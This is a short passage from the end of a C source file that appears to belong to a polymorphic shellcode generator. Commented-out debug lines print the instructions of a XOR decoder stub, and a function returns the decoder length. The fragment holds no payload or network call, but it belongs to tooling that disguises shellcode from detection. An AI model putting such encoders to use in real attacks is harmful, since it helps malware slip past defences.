	printf("\t%s\n", SetCounterCL[dw8BitRegisterVariant].Comment);
	printf("\t%s\n", MovCalcReg[dw8BitRegisterVariant].Comment);
	printf("\t%s\n", NegCalcReg[dw8BitRegisterVariant].Comment);
	printf("\t%s [0x%0.2X]\n", AddXorKey[dw8BitRegisterVariant].Comment, dw8BitRegisterVariant == 0x00 ? AddXorKey[dw8BitRegisterVariant].InstructionSet[1] : AddXorKey[dw8BitRegisterVariant].InstructionSet[2]);
	printf("\t%s\n", AddBufferSize[dw8BitRegisterVariant].Comment);
	printf("\t%s [0x%0.2X 0x%0.2X]\n", XorCalcReg->Comment, XorCalcReg->InstructionSet[0], XorCalcReg->InstructionSet[1]);
	printf("\t%s\n", IncAddrReg[dw64BitRegisterVariant].Comment);
	printf("\t%s [0x%0.2X 0x%0.2X]\n", LoopCalcOffset->Comment, LoopCalcOffset->InstructionSet[0], LoopCalcOffset->InstructionSet[1]);
	printf("\t%s\n", PopAddr[dw64BitRegisterVariant].Comment);
	printf("\t%s [0x%0.8X]\n", CallOffset->Comment, CallOffset->InstructionSet[1]);
	printf("\n");
    */

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==


	*pdwTinyXorDecoderLength = dwShellcodeLength;

    return TRUE;
}

















#endif // !POLY_SHELLCODE_GEN